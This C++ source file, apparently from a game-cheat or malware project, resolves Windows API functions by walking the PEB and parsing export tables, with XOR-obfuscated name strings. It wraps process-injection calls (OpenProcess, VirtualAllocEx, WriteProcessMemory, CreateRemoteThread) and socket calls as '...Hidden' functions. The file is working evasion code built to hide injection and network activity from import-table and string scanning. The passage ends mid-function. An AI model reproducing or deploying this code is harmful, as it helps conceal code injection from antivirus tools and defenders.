#include "WinAPI.h"
#include "../Utils/pipi.h"

DWORD getKernel32Address()
{
	DWORD dwAddr = 0;

	__asm
	{
		mov ebx, fs: [0x30]		//Getting PEB
		mov ebx, [ebx + 0x0C]
		mov ebx, [ebx + 0x14]
		mov ebx, [ebx]
		mov ebx, [ebx]
		mov ebx, [ebx + 0x10]	//third entry -> kernel32 base address
		mov dwAddr, ebx
	}

	return dwAddr;
}


//Credits: Shebaw
void* get_proc_address(DWORD module, const char* proc_name)
{
	char* modb = (char*)module;

	IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)modb;

	IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)(modb + dos_header->e_lfanew);

	IMAGE_OPTIONAL_HEADER* opt_header = &nt_headers->OptionalHeader;

	IMAGE_DATA_DIRECTORY* exp_entry = (IMAGE_DATA_DIRECTORY*)(&opt_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);

	IMAGE_EXPORT_DIRECTORY* exp_dir = (IMAGE_EXPORT_DIRECTORY*)(modb + exp_entry->VirtualAddress);

	void** func_table = (void**)(modb + exp_dir->AddressOfFunctions);

	WORD* ord_table = (WORD*)(modb + exp_dir->AddressOfNameOrdinals);

	char** name_table = (char**)(modb + exp_dir->AddressOfNames);

	void* address = NULL;

	DWORD i;

	if (((DWORD)proc_name >> 16) == 0)
	{
		WORD ordinal = LOWORD(proc_name);
		DWORD ord_base = exp_dir->Base;

		if (ordinal < ord_base || ordinal > ord_base + exp_dir->NumberOfFunctions)
			return NULL;

		address = (void*)(modb + (DWORD)func_table[ordinal - ord_base]);
	}
	else
	{
		for (i = 0; i < exp_dir->NumberOfNames; i++)
		{
			if (strcmp(proc_name, modb + (DWORD)name_table[i]) == 0)
				address = (void*)(modb + (DWORD)func_table[ord_table[i]]);
		}
	}

	if ((char*)address >= (char*)exp_dir && (char*)address < (char*)exp_dir + exp_entry->Size)
	{
		char* dll_name, * func_name;

		HMODULE frwd_module;

		dll_name = _strdup((char*)address);

		if (!dll_name)
			return NULL;

		address = NULL;

		func_name = strchr(dll_name, '.');

		*func_name++ = 0;

		//frwd_module = GetModuleHandle(dll_name);

		static std::string sModuleHandleA = /*GetModuleHandleA*/XorStr<0xB3, 17, 0xA6CC7E26>("\xF4\xD1\xC1\xFB\xD8\xDC\xCC\xD6\xDE\xF4\xDC\xD0\xDB\xAC\xA4\x83" + 0xA6CC7E26).s;

		DWORD dwGetModuleHandle = (DWORD)get_proc_address(getKernel32Address(), sModuleHandleA.data());

		__asm
		{
			push dll_name
			call dwGetModuleHandle
			mov frwd_module, eax
		}

		if (!frwd_module)
		{
			static std::string sLoadLibA = /*LoadLibraryA*/XorStr<0x79, 13, 0x05166242>("\x35\x15\x1A\x18\x31\x17\x1D\xF2\xE0\xF0\xFA\xC5" + 0x05166242).s;

			DWORD dwLoadLibrary = (DWORD)get_proc_address(getKernel32Address(), sLoadLibA.data());

			__asm
			{
				push dll_name
				call DWORD PTR dwLoadLibrary
				mov frwd_module, eax
			}
		}

		if (frwd_module)
			address = get_proc_address((DWORD)frwd_module, func_name);

		free(dll_name);
	}

	return address;
}

//////////////////////////////////////////////////////////////////////////
//  callWinAPIFunction - remember to pass arguments by calling convention
//! Hiding an WinAPI call
//! 
//! \param pszModule - Module name
//! \param pszFunction - Function names
//! \param arguments - Number of argmuents
//! \param ... - Pass arguments here
//! \return PVOID
//////////////////////////////////////////////////////////////////////////

PVOID callWinAPIFunction(LPCTSTR pszModule, LPCTSTR pszFunction, int arguments, ...)
{
	HANDLE hModule;

	static std::string sLoadLibA = /*LoadLibraryA*/XorStr<0x79, 13, 0x05166242>("\x35\x15\x1A\x18\x31\x17\x1D\xF2\xE0\xF0\xFA\xC5" + 0x05166242).s;

	DWORD dwLoadLibrary = (DWORD)get_proc_address(getKernel32Address(), sLoadLibA.data());
	PVOID pRet;

	__asm
	{
		push pszModule
		call dwLoadLibrary
		mov hModule, eax
	}

	if (!hModule)
		return NULL;

	DWORD dwFunctionAddr = (DWORD)get_proc_address((DWORD)hModule, pszFunction);

	if (!dwFunctionAddr)
		return NULL;

	/*printf("Kernel32.dll: 0x%x \n", getKernel32Address());
	printf("LoadLibrary: 0x%x \n", dwLoadLibrary);
	printf("%s: 0x%x \n", pszModule, (DWORD)hModule);
	printf("%s: 0x%x \n", pszFunction, dwFunctionAddr);*/

	va_list params;
	void* pParam;
	va_start(params, arguments);

	for (int ax = 0; ax < arguments; ax++)
	{
		pParam = va_arg(params, void*);
		__asm { push pParam }
	}

	__asm
	{
		call DWORD PTR dwFunctionAddr
		mov pRet, eax
	}

	va_end(params);

	return pRet;
}

int MessageBoxHidden(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
{
	return (int)callWinAPIFunction(/*USER32.dll*/XorStr<0x96, 11, 0x2E9A372E>("\xC3\xC4\xDD\xCB\xA9\xA9\xB2\xF9\xF2\xF3" + 0x2E9A372E).s,/*MessageBoxA*/XorStr<0x8B, 12, 0x80D32922>("\xC6\xE9\xFE\xFD\xEE\xF7\xF4\xD0\xFC\xEC\xD4" + 0x80D32922).s, 4, uType, lpCaption, lpText, hWnd);
}

void GdiplusShutdownHidden(ULONG_PTR token)
{
	callWinAPIFunction(/*gdiplus.dll*/XorStr<0xD0, 12, 0x5E2C63C8>("\xB7\xB5\xBB\xA3\xB8\xA0\xA5\xF9\xBC\xB5\xB6" + 0x5E2C63C8).s,/*GdiplusShutdown*/XorStr<0x35, 16, 0x6B628A35>("\x72\x52\x5E\x48\x55\x4F\x48\x6F\x55\x4B\x4B\x24\x2E\x35\x2D" + 0x6B628A35).s, 1, token);
}

void GetPrivateProfileStringHidden(LPCSTR lpAppName, LPCSTR lpKeyName, LPCSTR lpDefault, LPSTR lpReturnedString, DWORD nSize, LPCSTR lpFileName)
{
	callWinAPIFunction(/*kernel32.dll*/XorStr<0x11, 13, 0x5A430A7C>("\x7A\x77\x61\x7A\x70\x7A\x24\x2A\x37\x7E\x77\x70" + 0x5A430A7C).s,/*GetPrivateProfileStringA*/XorStr<0xB0, 25, 0xE4A7E1BA>("\xF7\xD4\xC6\xE3\xC6\xDC\xC0\xD6\xCC\xDC\xEA\xC9\xD3\xDB\xD7\xD3\xA5\x92\xB6\xB1\xAD\xAB\xA1\x86" + 0xE4A7E1BA).s, 6, lpFileName, nSize, lpReturnedString, lpDefault, lpKeyName, lpAppName);
}

void InitCommonControlsHidden()
{
	callWinAPIFunction(/*COMCTL32.dll*/XorStr<0xDE, 13, 0xD8E8952F>("\x9D\x90\xAD\xA2\xB6\xAF\xD7\xD7\xC8\x83\x84\x85" + 0xD8E8952F).s,/*InitCommonControls*/XorStr<0x6F, 19, 0xC514FA59>("\x26\x1E\x18\x06\x30\x1B\x18\x1B\x18\x16\x3A\x15\x15\x08\x0F\x11\x13\xF3" + 0xC514FA59).s, 0);
}

void GetModuleFileNameHidden(HMODULE hModule, LPSTR lpFilename, DWORD nSize)
{
	callWinAPIFunction(/*kernel32.dll*/XorStr<0x11, 13, 0x5A430A7C>("\x7A\x77\x61\x7A\x70\x7A\x24\x2A\x37\x7E\x77\x70" + 0x5A430A7C).s,/*GetModuleFileNameA*/XorStr<0xCE, 19, 0xB0F4D249>("\x89\xAA\xA4\x9C\xBD\xB7\xA1\xB9\xB3\x91\xB1\xB5\xBF\x95\xBD\xB0\xBB\x9E" + 0xB0F4D249).s, 3, nSize, lpFilename, hModule);
}

void GetWindowRectHidden(HWND hWnd, LPRECT lpRect)
{
	callWinAPIFunction(/*USER32.dll*/XorStr<0xDA, 11, 0x4F3C70BF>("\x8F\x88\x99\x8F\xED\xED\xCE\x85\x8E\x8F" + 0x4F3C70BF).s,/*GetWindowRect*/XorStr<0x24, 14, 0x24AF0D3D>("\x63\x40\x52\x70\x41\x47\x4E\x44\x5B\x7F\x4B\x4C\x44" + 0x24AF0D3D).s, 2, lpRect, hWnd);
}

HWND GetDesktopWindowHidden()
{
	return (HWND)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*GetDesktopWindow*/XorStr<0xB3, 17, 0xECE9F978>("\xF4\xD1\xC1\xF2\xD2\xCB\xD2\xCE\xD4\xCC\xEA\xD7\xD1\xA4\xAE\xB5" + 0xECE9F978).s, 0);
}

void WritePrivateProfileStringHidden(LPCSTR lpAppName, LPCSTR lpKeyName, LPCSTR lpString, LPCSTR lpFileName)
{
	callWinAPIFunction(/*kernel32.dll*/XorStr<0xCC, 13, 0x325087DD>("\xA7\xA8\xBC\xA1\xB5\xBD\xE1\xE1\xFA\xB1\xBA\xBB" + 0x325087DD).s,/*WritePrivateProfileStringA*/XorStr<0xC7, 27, 0x634757C7>("\x90\xBA\xA0\xBE\xAE\x9C\xBF\xA7\xB9\xB1\xA5\xB7\x83\xA6\xBA\xB0\xBE\xB4\xBC\x89\xAF\xAE\xB4\xB0\xB8\xA1" + 0x634757C7).s, 4, lpFileName, lpString, lpKeyName, lpAppName);
}

HFONT CreateFontHidden(int cHeight, int cWidth, int cEscapement, int cOrientation, int cWeight, DWORD bItalic, DWORD bUnderline, DWORD bStrikeOut, DWORD iCharSet, DWORD iOutPrecision, DWORD iClipPrecision, DWORD iQuality, DWORD iPitchAndFamily, LPCSTR pszFaceName)
{
	return (HFONT)callWinAPIFunction(/*GDI32.dll*/XorStr<0x00, 10, 0x4B1795A5>("\x47\x45\x4B\x30\x36\x2B\x62\x6B\x64" + 0x4B1795A5).s,/*CreateFontA*/XorStr<0x72, 12, 0x7DE2173A>("\x31\x01\x11\x14\x02\x12\x3E\x16\x14\x0F\x3D" + 0x7DE2173A).s, 14, pszFaceName, iPitchAndFamily, iQuality, iClipPrecision, iOutPrecision, iCharSet, bStrikeOut, bUnderline, bItalic, cWeight, cOrientation, cEscapement, cWidth, cHeight);
}

void SendMessageHidden(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*SendMessageA*/XorStr<0x84, 13, 0xA2FEBA11>("\xD7\xE0\xE8\xE3\xC5\xEC\xF9\xF8\xED\xEA\xEB\xCE" + 0xA2FEBA11).s, 4, lParam, wParam, Msg, hWnd);
}

HWND CreateWindowExAHidden(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam)
{
	return (HWND)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*CreateWindowExA*/XorStr<0x19, 16, 0x4583DE3E>("\x5A\x68\x7E\x7D\x69\x7B\x48\x49\x4F\x46\x4C\x53\x60\x5E\x66" + 0x4583DE3E).s, 12, lpParam, hInstance, hMenu, hWndParent, nHeight, nWidth, Y, X, dwStyle, lpWindowName, lpClassName, dwExStyle);
}

void GetDlgItemTextHidden(HWND hDlg, int nIDDlgItem, LPSTR lpString, int cchMax)
{
	callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*GetDlgItemTextA*/XorStr<0xBB, 16, 0x58877860>("\xFC\xD9\xC9\xFA\xD3\xA7\x88\xB6\xA6\xA9\x91\xA3\xBF\xBC\x88" + 0x58877860).s, 4, cchMax, lpString, nIDDlgItem, hDlg);
}

LRESULT SendDlgItemMessageHidden(HWND hDlg, int nIDDlgItem, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	return (LRESULT)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*SendDlgItemMessageA*/XorStr<0x1E, 20, 0x825FC507>("\x4D\x7A\x4E\x45\x66\x4F\x43\x6C\x52\x42\x45\x64\x4F\x58\x5F\x4C\x49\x4A\x71" + 0x825FC507).s, 5, lParam, wParam, Msg, nIDDlgItem, hDlg);
}

HICON LoadIconHidden(HINSTANCE hInstance, LPCSTR lpIconName)
{
	return (HICON)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*LoadIconA*/XorStr<0x41, 10, 0x36BBE55F>("\x0D\x2D\x22\x20\x0C\x25\x28\x26\x08" + 0x36BBE55F).s, 2, lpIconName, hInstance);
}

HCURSOR LoadCursorHidden(HINSTANCE hInstance, LPCSTR lpCursorName)
{
	return (HCURSOR)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*LoadCursorA*/XorStr<0xD2, 12, 0xAB134F25>("\x9E\xBC\xB5\xB1\x95\xA2\xAA\xAA\xB5\xA9\x9D" + 0xAB134F25).s, 2, lpCursorName, hInstance);
}

HMODULE GetModuleHandleHidden(LPCSTR lpModuleName)
{
	return (HMODULE)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*GetModuleHandleA*/XorStr<0x3D, 17, 0xC4FDC188>("\x7A\x5B\x4B\x0D\x2E\x26\x36\x28\x20\x0E\x26\x26\x2D\x26\x2E\x0D" + 0xC4FDC188).s, 1, lpModuleName);
}

ATOM RegisterClassExHidden(const WNDCLASSEXA* lpwcx)
{
	return (ATOM)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*RegisterClassExA*/XorStr<0xF7, 17, 0x7365CE4B>("\xA5\x9D\x9E\x93\x88\x88\x98\x8C\xBC\x6C\x60\x71\x70\x41\x7D\x47" + 0x7365CE4B).s, 1, lpwcx);
}

void FormatMessageHidden(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list* Arguments)
{
	callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*FormatMessageA*/XorStr<0xE7, 15, 0xA58002B3>("\xA1\x87\x9B\x87\x8A\x98\xA0\x8B\x9C\x83\x90\x95\x96\xB5" + 0xA58002B3).s, 7, Arguments, nSize, lpBuffer, dwLanguageId, dwMessageId, lpSource, dwFlags);
}

DWORD GetLastErrorHidden()
{
	return (DWORD)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*GetLastError*/XorStr<0xC8, 13, 0x28072AC1>("\x8F\xAC\xBE\x87\xAD\xBE\xBA\x8A\xA2\xA3\xBD\xA1" + 0x28072AC1).s, 0);
}

int WSAStartupHidden(WORD wVersionRequested, LPWSADATA lpWSAData)
{
	return (int)callWinAPIFunction(/*WS2_32.dll*/XorStr<0xB0, 11, 0xCE1DFDBD>("\xE7\xE2\x80\xEC\x87\x87\x98\xD3\xD4\xD5" + 0xCE1DFDBD).s,/*WSAStartup*/XorStr<0x33, 11, 0x35E1D417>("\x64\x67\x74\x65\x43\x59\x4B\x4E\x4E\x4C" + 0x35E1D417).s, 2, lpWSAData, wVersionRequested);
}

void ExitProcessHidden(UINT uExitCode)
{
	callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*ExitProcess*/XorStr<0x65, 12, 0xA6D579E4>("\x20\x1E\x0E\x1C\x39\x18\x04\x0F\x08\x1D\x1C" + 0xA6D579E4).s, 1, uExitCode);
}

int getaddrinfoHidden(PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA* pHints, PADDRINFOA* ppResult)
{
	return (int)callWinAPIFunction(/*WS2_32.dll*/XorStr<0xB0, 11, 0xCE1DFDBD>("\xE7\xE2\x80\xEC\x87\x87\x98\xD3\xD4\xD5" + 0xCE1DFDBD).s,/*getaddrinfo*/XorStr<0x86, 12, 0xA973FE9B>("\xE1\xE2\xFC\xE8\xEE\xEF\xFE\xE4\xE0\xE9\xFF" + 0xA973FE9B).s, 4, ppResult, pHints, pServiceName, pNodeName);
}

SOCKET socketHidden(int af, int type, int protocol)
{
	return (SOCKET)callWinAPIFunction(/*WS2_32.dll*/XorStr<0xB0, 11, 0xCE1DFDBD>("\xE7\xE2\x80\xEC\x87\x87\x98\xD3\xD4\xD5" + 0xCE1DFDBD).s,/*socket*/XorStr<0xF6, 7, 0x8EC56AC7>("\x85\x98\x9B\x92\x9F\x8F" + 0x8EC56AC7).s, 3, protocol, type, af);
}

void freeaddrinfoHidden(PADDRINFOA pAddrInfo)
{
	callWinAPIFunction(/*WS2_32.dll*/XorStr<0xB0, 11, 0xCE1DFDBD>("\xE7\xE2\x80\xEC\x87\x87\x98\xD3\xD4\xD5" + 0xCE1DFDBD).s,/*freeaddrinfo*/XorStr<0xCA, 13, 0x648EB004>("\xAC\xB9\xA9\xA8\xAF\xAB\xB4\xA3\xBB\xBD\xB2\xBA" + 0x648EB004).s, 1, pAddrInfo);
}

int sendHidden(SOCKET s, const char FAR* buf, int len, int flags)
{
	return (int)callWinAPIFunction(/*WS2_32.dll*/XorStr<0xB0, 11, 0xCE1DFDBD>("\xE7\xE2\x80\xEC\x87\x87\x98\xD3\xD4\xD5" + 0xCE1DFDBD).s,/*send*/XorStr<0x46, 5, 0x4A4A654F>("\x35\x22\x26\x2D" + 0x4A4A654F).s, 4, flags, len, buf, s);
}

int closesocketHidden(SOCKET s)
{
	return (int)callWinAPIFunction(/*WS2_32.dll*/XorStr<0xB0, 11, 0xCE1DFDBD>("\xE7\xE2\x80\xEC\x87\x87\x98\xD3\xD4\xD5" + 0xCE1DFDBD).s,/*closesocket*/XorStr<0x7F, 12, 0x69E01E8F>("\x1C\xEC\xEE\xF1\xE6\xF7\xEA\xE5\xEC\xED\xFD" + 0x69E01E8F).s, 1, s);
}

int WSACleanupHidden()
{
	return (int)callWinAPIFunction(/*WS2_32.dll*/XorStr<0xB0, 11, 0xCE1DFDBD>("\xE7\xE2\x80\xEC\x87\x87\x98\xD3\xD4\xD5" + 0xCE1DFDBD).s,/*WSACleanup*/XorStr<0x45, 11, 0x340AB75B>("\x12\x15\x06\x0B\x25\x2F\x2A\x22\x38\x3E" + 0x340AB75B).s, 0);
}

int recvHidden(SOCKET s, char FAR* buf, int len, int flags)
{
	return (int)callWinAPIFunction(/*WS2_32.dll*/XorStr<0xB0, 11, 0xCE1DFDBD>("\xE7\xE2\x80\xEC\x87\x87\x98\xD3\xD4\xD5" + 0xCE1DFDBD).s,/*recv*/XorStr<0x6E, 5, 0xE4BC821C>("\x1C\x0A\x13\x07" + 0xE4BC821C).s, 4, flags, len, buf, s);
}

int connectHidden(SOCKET s, const struct sockaddr FAR* name, int namelen)
{
	return (int)callWinAPIFunction(/*WS2_32.dll*/XorStr<0xB0, 11, 0xCE1DFDBD>("\xE7\xE2\x80\xEC\x87\x87\x98\xD3\xD4\xD5" + 0xCE1DFDBD).s,/*connect*/XorStr<0x6E, 8, 0x82E641E3>("\x0D\x00\x1E\x1F\x17\x10\x00" + 0x82E641E3).s, 3, namelen, name, s);
}

HANDLE CreateToolhelp32SnapshotHidden(DWORD dwFlags, DWORD th32ProcessID)
{
	return (HANDLE)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*CreateToolhelp32Snapshot*/XorStr<0x9C, 25, 0x70BD1F54>("\xDF\xEF\xFB\xFE\xD4\xC4\xF6\xCC\xCB\xC9\xCE\xC2\xC4\xD9\x99\x99\xFF\xC3\xCF\xDF\xC3\xD9\xDD\xC7" + 0x70BD1F54).s, 2, th32ProcessID, dwFlags);
}

BOOL Process32FirstHidden(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*Process32First*/XorStr<0x97, 15, 0xBAD592F8>("\xC7\xEA\xF6\xF9\xFE\xEF\xEE\xAD\xAD\xE6\xC8\xD0\xD0\xD0" + 0xBAD592F8).s, 2, lppe, hSnapshot);
}

BOOL Process32NextHidden(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*Process32Next*/XorStr<0xA3, 14, 0x75B8AB9C>("\xF3\xD6\xCA\xC5\xC2\xDB\xDA\x99\x99\xE2\xC8\xD6\xDB" + 0x75B8AB9C).s, 2, lppe, hSnapshot);
}

BOOL CloseHandleHidden(HANDLE hObject)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*CloseHandle*/XorStr<0x5E, 12, 0x663954EB>("\x1D\x33\x0F\x12\x07\x2B\x05\x0B\x02\x0B\x0D" + 0x663954EB).s, 1, hObject);
}

HANDLE OpenProcessHidden(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
{
	return (HANDLE)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*OpenProcess*/XorStr<0xD5, 12, 0xAAFE3899>("\x9A\xA6\xB2\xB6\x89\xA8\xB4\xBF\xB8\xAD\xAC" + 0xAAFE3899).s, 3, dwProcessId, bInheritHandle, dwDesiredAccess);
}

LPVOID VirtualAllocExHidden(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
	return (LPVOID)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*VirtualAllocEx*/XorStr<0xEA, 15, 0xE891184E>("\xBC\x82\x9E\x99\x9B\x8E\x9C\xB0\x9E\x9F\x9B\x96\xB3\x8F" + 0xE891184E).s, 5, flProtect, flAllocationType, dwSize, lpAddress, hProcess);
}

BOOL Module32FirstHidden(HANDLE hSnapshot, LPMODULEENTRY32 lpme)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*Module32First*/XorStr<0x1A, 14, 0x5ABB90EE>("\x57\x74\x78\x68\x72\x7A\x13\x13\x64\x4A\x56\x56\x52" + 0x5ABB90EE).s, 2, lpme, hSnapshot);
}

BOOL Module32NextHidden(HANDLE hSnapshot, LPMODULEENTRY32 lpme)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*Module32Next*/XorStr<0xBA, 13, 0x61DB9C09>("\xF7\xD4\xD8\xC8\xD2\xDA\xF3\xF3\x8C\xA6\xBC\xB1" + 0x61DB9C09).s, 2, lpme, hSnapshot);
}

BOOL WriteProcessMemoryHidden(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*WriteProcessMemory*/XorStr<0x37, 19, 0x1DACE785>("\x60\x4A\x50\x4E\x5E\x6C\x4F\x51\x5C\x25\x32\x31\x0E\x21\x28\x29\x35\x31" + 0x1DACE785).s, 5, lpNumberOfBytesWritten, nSize, lpBuffer, lpBaseAddress, hProcess);
}

SIZE_T VirtualQueryExHidden(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength)
{
	return (SIZE_T)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*VirtualQueryEx*/XorStr<0xA0, 15, 0xF64199B9>("\xF6\xC8\xD0\xD7\xD1\xC4\xCA\xF6\xDD\xCC\xD8\xD2\xE9\xD5" + 0xF64199B9).s, 4, dwLength, lpBuffer, lpAddress, hProcess);
}

BOOL VirtualProtectExHidden(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*VirtualProtectEx*/XorStr<0xB2, 17, 0x44BB80E9>("\xE4\xDA\xC6\xC1\xC3\xD6\xD4\xE9\xC8\xD4\xC8\xD8\xDD\xCB\x85\xB9" + 0x44BB80E9).s, 5, lpflOldProtect, flNewProtect, dwSize, lpAddress, hProcess);
}

BOOL FlushInstructionCacheHidden(HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*FlushInstructionCache*/XorStr<0xD9, 22, 0x450CD89C>("\x9F\xB6\xAE\xAF\xB5\x97\xB1\x93\x95\x90\x96\x87\x91\x8F\x88\x86\xAA\x8B\x88\x84\x88" + 0x450CD89C).s, 3, dwSize, lpBaseAddress, hProcess);
}

BOOL VirtualProtectHidden(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*VirtualProtect*/XorStr<0xAA, 15, 0x079A853F>("\xFC\xC2\xDE\xD9\xDB\xCE\xDC\xE1\xC0\xDC\xC0\xD0\xD5\xC3" + 0x079A853F).s, 4, lpflOldProtect, flNewProtect, dwSize, lpAddress);
}

HANDLE CreateRemoteThreadHidden(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
{
	return (HANDLE)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*CreateRemoteThread*/XorStr<0x15, 19, 0x9F5333E5>("\x56\x64\x72\x79\x6D\x7F\x49\x79\x70\x71\x6B\x45\x75\x4A\x51\x41\x44\x42" + 0x9F5333E5).s, 7, lpThreadId, dwCreationFlags, lpParameter, lpStartAddress, dwStackSize, lpThreadAttributes, hProcess);
}

DWORD WaitForSingleObjectHidden(HANDLE hHandle, DWORD dwMilliseconds)
{
	return (DWORD)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*WaitForSingleObject*/XorStr<0x30, 20, 0x2AC21AAD>("\x67\x50\x5B\x47\x72\x5A\x44\x64\x51\x57\x5D\x57\x59\x72\x5C\x55\x25\x22\x36" + 0x2AC21AAD).s, 2, dwMilliseconds, hHandle);
}

HGDIOBJ SelectObjectHidden(HDC hdc, HGDIOBJ h)
{
	return (HGDIOBJ)callWinAPIFunction(/*GDI32.dll*/XorStr<0xCC, 10, 0xF69622B0>("\x8B\x89\x87\xFC\xE2\xFF\xB6\xBF\xB8" + 0xF69622B0).s,/*SelectObject*/XorStr<0x46, 13, 0x472DEEEE>("\x15\x22\x24\x2C\x29\x3F\x03\x2F\x24\x2A\x33\x25" + 0x472DEEEE).s, 2, h, hdc);
}

HBRUSH CreateSolidBrushHidden(COLORREF color)
{
